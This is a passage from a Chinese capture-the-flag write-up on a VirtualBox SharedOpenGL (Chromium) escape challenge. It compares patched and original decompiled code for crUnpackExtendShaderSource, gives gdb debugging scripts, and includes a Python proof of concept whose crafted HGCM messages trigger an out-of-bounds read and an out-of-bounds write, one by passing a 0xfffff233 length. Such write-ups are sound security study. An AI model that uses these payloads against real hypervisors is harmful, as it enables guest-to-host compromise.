class="line">            <span class="keyword">if</span> ( count - <span class="number">1</span> == (_DWORD)v22 )</span><br><span class="line">              --v23;</span><br><span class="line">            <span class="keyword">if</span> ( v23 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v24 = (unsigned int)(v23 - <span class="number">1</span>);</span><br><span class="line">              v25 = <span class="number">0L</span>L;</span><br><span class="line">              v26 = v24 + <span class="number">1</span>;</span><br><span class="line">              do</span><br><span class="line">              &#123;</span><br><span class="line">                v27 = (_BYTE *)(v25 + *v21);</span><br><span class="line">                <span class="keyword">if</span> ( !*v27 )</span><br><span class="line">                  *v27 = <span class="number">10</span>;</span><br><span class="line">                ++v25;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v26 != v25 );</span><br><span class="line">            &#125;</span><br><span class="line">            ++v22;</span><br><span class="line">            ++v21;</span><br><span class="line">            <span class="keyword">if</span> ( count &lt;= (int)v22 )</span><br><span class="line">            &#123;</span><br><span class="line">              v28 = v19;</span><br><span class="line">              (*(void (__fastcall **)(_QWORD, __int64, __int64, _QWORD))(a1-&gt;pdispatchtbl + 3944))(v18, 1LL, v19, 0LL);</span><br><span class="line">              j_crFree(v28);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v20 = pos_1;</span><br><span class="line">          &#125;</span><br><span class="line">          goto LABEL_31;</span><br><span class="line">        &#125;</span><br><span class="line">        v12 = pos_1;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>;</span><br><span class="line">LABEL_29:</span><br><span class="line">      crError((_DWORD)v9, v12, pos, v7, v11, a6);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">  a1-&gt;rcunpack = -41;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0xf1230-origin"><a href="#0xf1230-origin" class="headerlink" title="0xf1230 - origin"></a>0xf1230 - origin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall sub_F1230(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4, __int64 a5, int a6)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v7; // rcx</span><br><span class="line">  _DWORD *v8; // r12</span><br><span class="line">  const char *v9; // rdi</span><br><span class="line">  int v10; // er13</span><br><span class="line">  int v11; // er8</span><br><span class="line">  int v12; // esi</span><br><span class="line">  unsigned __int64 v13; // rax</span><br><span class="line">  int v14; // er15 MAPDST</span><br><span class="line">  char *v15; // rsi</span><br><span class="line">  _DWORD *v16; // rdi</span><br><span class="line">  unsigned int v18; // er14</span><br><span class="line">  __int64 v19; // rax</span><br><span class="line">  unsigned __int64 v20; // r9</span><br><span class="line">  _QWORD *v21; // rdi</span><br><span class="line">  __int64 v22; // r10</span><br><span class="line">  int v23; // edx</span><br><span class="line">  __int64 v24; // r9</span><br><span class="line">  __int64 v25; // rdx</span><br><span class="line">  __int64 v26; // r9</span><br><span class="line">  _BYTE *v27; // rcx</span><br><span class="line">  __int64 v28; // [rsp+<span class="number">18</span>h] [rbp<span class="number">-38</span>h]</span><br><span class="line"></span><br><span class="line">  v7 = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0x13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD **)(a1 + <span class="number">16</span>);</span><br><span class="line">    v9 = <span class="string">"crUnpackExtendShaderSource: count %u is out of range"</span>;</span><br><span class="line">    v10 = v8[<span class="number">3</span>];</span><br><span class="line">    v11 = v10 - <span class="number">1</span>;</span><br><span class="line">    v12 = v10;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)(v10 - <span class="number">1</span>) &gt; <span class="number">0x3FFFFFD</span> )</span><br><span class="line">      goto LABEL_30;</span><br><span class="line">    a3 = <span class="number">4L</span>L * v10 + <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = (unsigned int)(<span class="number">4</span> * v10 + <span class="number">20</span>);</span><br><span class="line">      v12 = <span class="number">4</span> * v10 + <span class="number">20</span>;</span><br><span class="line">      v14 = v12;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= v13 )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(a3) = v8[<span class="number">4</span>];</span><br><span class="line">        v15 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( (int)a3 &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = (char *)v8 + v13;</span><br><span class="line">          v14 = v13 + <span class="number">4</span> * v10;</span><br><span class="line">        &#125;</span><br><span class="line">        a6 = v14;</span><br><span class="line">        <span class="keyword">if</span> ( v7 &gt;= v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = v8 + <span class="number">5</span>;</span><br><span class="line">          do</span><br><span class="line">          &#123;</span><br><span class="line">            LODWORD(a3) = *v16;</span><br><span class="line">            <span class="keyword">if</span> ( (int)*v16 &lt;= <span class="number">0</span> || <span class="number">0x7FFFFFFF</span> - (int)a3 &lt;= v14 || v7 &lt; v14 || (v14 += a3, LODWORD(a3) = v14, v7 &lt; v14) )</span><br><span class="line">            &#123;</span><br><span class="line">              v12 = v14;</span><br><span class="line">              v9 = <span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>;</span><br><span class="line">              goto LABEL_30;</span><br><span class="line">            &#125;</span><br><span class="line">            ++v16;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v16 != &amp;v8[v11 + <span class="number">6</span>] );</span><br><span class="line">          v18 = v8[<span class="number">2</span>];</span><br><span class="line">          v19 = crAlloc((unsigned int)(<span class="number">8</span> * v10));</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          v20 = v14;</span><br><span class="line">          v21 = (_QWORD *)v19;</span><br><span class="line">          v22 = <span class="number">0L</span>L;</span><br><span class="line">          <span class="keyword">while</span> ( *(_QWORD *)(a1 + <span class="number">24</span>) &gt;= v20 )</span><br><span class="line">          &#123;</span><br><span class="line">            *v21 = *(_QWORD *)(a1 + <span class="number">16</span>) + v20;</span><br><span class="line">            v23 = v8[v22 + <span class="number">5</span>];</span><br><span class="line">            v14 += v23;</span><br><span class="line">            <span class="keyword">if</span> ( !v15 )</span><br><span class="line">              v8[v22 + <span class="number">5</span>] = --v23;</span><br><span class="line">            <span class="keyword">if</span> ( v10 - <span class="number">1</span> == (_DWORD)v22 )</span><br><span class="line">              --v23;</span><br><span class="line">            <span class="keyword">if</span> ( v23 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v24 = (unsigned int)(v23 - <span class="number">1</span>);</span><br><span class="line">              v25 = <span class="number">0L</span>L;</span><br><span class="line">              v26 = v24 + <span class="number">1</span>;</span><br><span class="line">              do</span><br><span class="line">              &#123;</span><br><span class="line">                v27 = (_BYTE *)(v25 + *v21);</span><br><span class="line">                <span class="keyword">if</span> ( !*v27 )</span><br><span class="line">                  *v27 = <span class="number">10</span>;</span><br><span class="line">                ++v25;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v26 != v25 );</span><br><span class="line">            &#125;</span><br><span class="line">            ++v22;</span><br><span class="line">            ++v21;</span><br><span class="line">            <span class="keyword">if</span> ( v10 &lt;= (int)v22 )</span><br><span class="line">            &#123;</span><br><span class="line">              v28 = v19;</span><br><span class="line">              (*(void (__fastcall **)(_QWORD, __int64, __int64, _QWORD))(*(_QWORD *)(a1 + <span class="number">48</span>) + <span class="number">3944L</span>L))(</span><br><span class="line">                v18,</span><br><span class="line">                <span class="number">1L</span>L,</span><br><span class="line">                v19,</span><br><span class="line">                <span class="number">0L</span>L);</span><br><span class="line">              j_crFree(v28);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v20 = v14;</span><br><span class="line">          &#125;</span><br><span class="line">          goto LABEL_32;</span><br><span class="line">        &#125;</span><br><span class="line">        v12 = v14;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>;</span><br><span class="line">LABEL_30:</span><br><span class="line">      crError((_DWORD)v9, v12, a3, v7, v11, a6);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_32:</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">56</span>) = <span class="number">-41</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的修改就更加微妙一点，我在patched版本的反编译代码加入了少量符号信息。主要是在patch版本在第58行判断越界的时候把其中<code>(int)*pos &lt;= 0 || 0x7FFFFFFF - (int)a3 &lt;= v14</code>的条件偷换成了<code>(int)pos &lt;= 0 &amp;&amp; (v16-&gt;field_0 &amp; 0x233) != 0x233</code> 。结合源码的话我们可以更清楚地看到patch所做的修改，相关代码位于<code>VirtualBox-6.0.13/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.cpp</code> 。</p>
<p>对比原题，结合<a href="https://zhuanlan.zhihu.com/p/58910752" target="_blank" rel="noopener">Tea Delivers的writeup</a>我们可以得出以下结论：</p>
<ol>
<li><code>crUnpackExtendGetUniformLocation</code> 部分越界读的漏洞和原题完全一样，然而wp给出的exp中并没有使用越界读，而是通过未初始化漏洞读取堆上残留的指针，因此这部分需要调试堆布局泄露目标指针。</li>
<li><code>crUnpackExtendShaderSource</code> 修改了检查size的条件，目测可以通过传入一个0x233结尾的负数绕过检查，达成越界写的效果。</li>
<li>调试发现关键结构体<code>CRConnection</code>的大小发生变化，原题是0x290，这里是0x238，里面成员变量的偏移也相应需要重新计算。这部分需要结合库文件的代码确定，没办法像上篇一样通过pahole工具很方便地确定。</li>
</ol>
<h2 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h2><p>前文提到了Hyper-V和Vmware冲突的情况，为了开启Vmware的嵌套虚拟化，只能暂时禁用掉了日常使用Hyper-V虚拟机。这个问题对比赛影响挺大的，因为常用的脚本工具，AD需要的所有东西都在Hyper-V虚拟机当中，而冲突造成Hyper-V和Vmware两个虚拟机就只能二选一，要打AD就不能同时调试这道RW题目。比赛后段还是切回Hyper-V去AD抢分数了，比赛结束后才把这题做出来。后来的调试方案是通过windows terminal ssh连接到vmware里面，然后结合调试脚本启动gdb attach VirtualBox的虚拟机。</p>
<p>感觉指望微软和Vmware解决这种小众的冲突问题怕是得等上一段时间了，也算是个教训吧，选虚拟机平台的时候还是尽量用Vmware这种业界选手普遍使用的。</p>
<p>为了尽可能虚拟机启动时间，提高调试效率，这里写了一个简单的调试脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">echo <span class="string">"[restore snapshot]"</span></span><br><span class="line">VBoxManage snapshot guest restore S1 <span class="comment"># 需要先建立一个名叫S1的快照</span></span><br><span class="line">echo <span class="string">"[+] start vm"</span></span><br><span class="line">VBoxManage startvm guest <span class="comment">#--type gui</span></span><br><span class="line">echo <span class="string">"[+] sleep 2 and attach"</span></span><br><span class="line">tmux split -h <span class="string">"sudo gdb -x 1.gdb attach `pgrep VirtualBoxVM`"</span></span><br><span class="line">echo <span class="string">"[+] sync exp"</span></span><br><span class="line">scp -P <span class="number">2222</span> -r <span class="number">3</span>dpwn ve@localhost:~/</span><br><span class="line">echo <span class="string">"[+] ssh"</span></span><br><span class="line">ssh ve@localhost -p <span class="number">2222</span></span><br></pre></td></tr></table></figure>
<p>1.gdb 主要是一些gdb的配置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.gdb</span></span><br><span class="line"><span class="comment"># gef layout settting</span></span><br><span class="line">gef config context.layout <span class="string">"-legend regs stack code args -source -threads -trace extra memory"</span></span><br><span class="line"><span class="comment"># load the base of VBoxSharedCrOpenGL.so</span></span><br><span class="line">source load_base.py</span><br><span class="line"><span class="comment"># insert breakpoint</span></span><br><span class="line">b * $B+<span class="number">0xf2c10</span></span><br><span class="line">b * $B+<span class="number">0xf2c32</span></span><br></pre></td></tr></table></figure>
<p>还写了一个自动加载目标库文件基地址的python script，可以自动把库文件基地址保存到<code>$B</code>，感觉这个方法有点挫，如果有直接用原生gdb script就能实现的方法请告诉我。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load_source.py</span></span><br><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">cmd = <span class="string">"cat /proc/`pgrep VirtualBoxVM`/maps | grep Cr | grep xp | awk -F - '&#123;print $1&#125;'"</span></span><br><span class="line">output = subprocess.check_output(cmd, shell=<span class="literal">True</span>).strip(<span class="string">b"\n"</span>)</span><br><span class="line">base = int(output, <span class="number">16</span>)</span><br><span class="line">gdb.execute(<span class="string">"set $B=%#x"</span> % base)</span><br></pre></td></tr></table></figure>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>在原exp的基础上改了一份poc，执行poc1或者poc2都可以造成Virtualbox虚拟机崩溃的效果。poc1对应的是<code>crUnpackExtendGetUniformLocation</code> 越界读的漏洞，poc2对应的是<code>crUnpackExtendShaderSource</code>越界写换行符的漏洞。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line">sys.path.append(os.path.abspath(os.path.dirname(__file__)) + <span class="string">'/lib'</span>)</span><br><span class="line"><span class="keyword">from</span> chromium <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hgcm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_oob_read</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">        + <span class="string">'\0\0\0'</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, offset)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, CR_GETUNIFORMLOCATION_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>)</span><br><span class="line">        + <span class="string">'LEET'</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input(<span class="string">"break"</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.spray_num = <span class="number">0x2000</span></span><br><span class="line">        self.spray_size = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poc1</span><span class="params">(self)</span>:</span></span><br><span class="line">        msg = make_oob_read(<span class="number">0x300</span>) </span><br><span class="line">        leak = crmsg(client1, msg, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poc2</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># trigger bug to enlarge a CRVBOXSVCBUFFER_t</span></span><br><span class="line">        msg = (pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0X41414141</span>, <span class="number">1</span>))</span><br><span class="line">        msg += <span class="string">"\x00\x00\x00"</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        msg += <span class="string">'aaaa'</span> </span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, CR_SHADERSOURCE_EXTEND_OPCODE)</span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>) <span class="comment">#shader</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">2</span>) <span class="comment">#count</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>) <span class="comment">#hasNoLocalLength</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0xfffff233</span>)<span class="comment">#pLocalLength</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0x500</span>)<span class="comment">#pLocalLength</span></span><br><span class="line">        ret = crmsg(self.client1, msg, self.spray_size)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.client1 = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">        set_version(self.client1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Pwn()</span><br><span class="line">    p.setup()</span><br><span class="line">    p.poc1()</span><br><span class="line">    p.poc2()</span><br></pre></td></tr></table></figure>
<p>第一个漏洞就和之前一样，这里还是解释一下第二个漏洞，贴一下patch之前的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">void crUnpackExtendShaderSource(PCrUnpackerState pState)</span><br><span class="line">&#123;</span><br><span class="line">    CHECK_BUFFER_SIZE_STATIC_LAST(pState, <span class="number">16</span>, GLsizei);</span><br><span class="line"></span><br><span class="line">    GLint *length = NULL;</span><br><span class="line">    GLuint shader = READ_DATA(pState, <span class="number">8</span>, GLuint);</span><br><span class="line">    GLsizei count = READ_DATA(pState, <span class="number">12</span>, GLsizei);</span><br><span class="line">    GLint hasNonLocalLen = READ_DATA(pState, <span class="number">16</span>, GLsizei);</span><br><span class="line">    GLint *pLocalLength = DATA_POINTER(pState, <span class="number">20</span>, GLint);</span><br><span class="line">    char **ppStrings = NULL;</span><br><span class="line">    GLsizei i, j, jUpTo;</span><br><span class="line">    int pos, pos_check;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span> || count &gt;= INT32_MAX / sizeof(GLint) / <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: count %u is out of range"</span>, count);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CHECK_ARRAY_SIZE_FROM_PTR_UPDATE_LAST(pState, pLocalLength, count, GLint);</span><br><span class="line"></span><br><span class="line">    /** @todo More verification required here. */</span><br><span class="line">    pos = <span class="number">20</span> + count * sizeof(*pLocalLength);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!DATA_POINTER_CHECK_SIZE(pState, pos))</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hasNonLocalLen &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        length = DATA_POINTER(pState, pos, GLint);</span><br><span class="line">        pos += count * sizeof(*length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos_check = pos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!DATA_POINTER_CHECK_SIZE(pState, pos_check))</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos_check = pos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pLocalLength[i] &lt;= <span class="number">0</span> || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK_SIZE(pState, pos_check))</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos_check);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pos_check += pLocalLength[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!DATA_POINTER_CHECK_SIZE(pState, pos_check))</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos_check);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ppStrings = (char **)crAlloc(count * sizeof(char*));</span><br><span class="line">    <span class="keyword">if</span> (!ppStrings) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        CHECK_BUFFER_SIZE_STATIC_UPDATE(pState, pos); /** @todo Free ppStrings on error. */</span><br><span class="line">        ppStrings[i] = DATA_POINTER(pState, pos, char);</span><br><span class="line">        pos += pLocalLength[i];</span><br><span class="line">        <span class="keyword">if</span> (!length)</span><br><span class="line">        &#123;</span><br><span class="line">            pLocalLength[i] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Assert(pLocalLength[i] &gt; <span class="number">0</span>);</span><br><span class="line">        jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; jUpTo; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            char *pString = ppStrings[i];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pString[j] == <span class="string">'\0'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Assert(j == jUpTo - <span class="number">1</span>);</span><br><span class="line">                pString[j] = <span class="string">'\n'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//    pState-&gt;pDispatchTbl-&gt;ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);</span><br><span class="line">    